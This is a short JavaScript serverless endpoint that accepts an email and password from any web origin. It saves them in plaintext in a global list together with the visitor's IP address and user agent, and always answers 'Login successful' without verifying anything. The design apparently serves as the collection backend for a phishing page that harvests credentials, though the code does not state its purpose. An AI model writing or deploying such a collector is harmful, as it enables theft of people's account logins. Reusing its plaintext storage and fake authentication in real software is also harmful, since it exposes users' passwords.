// Global storage that persists across function calls
if (!global.credentials) {
    global.credentials = [];
}

export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }

    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({
            success: false,
            message: 'Email and password are required'
        });
    }

    // Create new entry
    const loginEntry = {
        id: Date.now(),
        email: email,
        password: password,
        timestamp: new Date().toISOString(),
        ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress,
        userAgent: req.headers['user-agent']
    };

    // Store in global storage
    global.credentials.push(loginEntry);

    console.log(`New login stored: ${email} at ${loginEntry.timestamp}`);

    res.json({
        success: true,
        message: 'Login successful',
        user: {
            email: email,
            name: email.split('@')[0]
        }
    });
}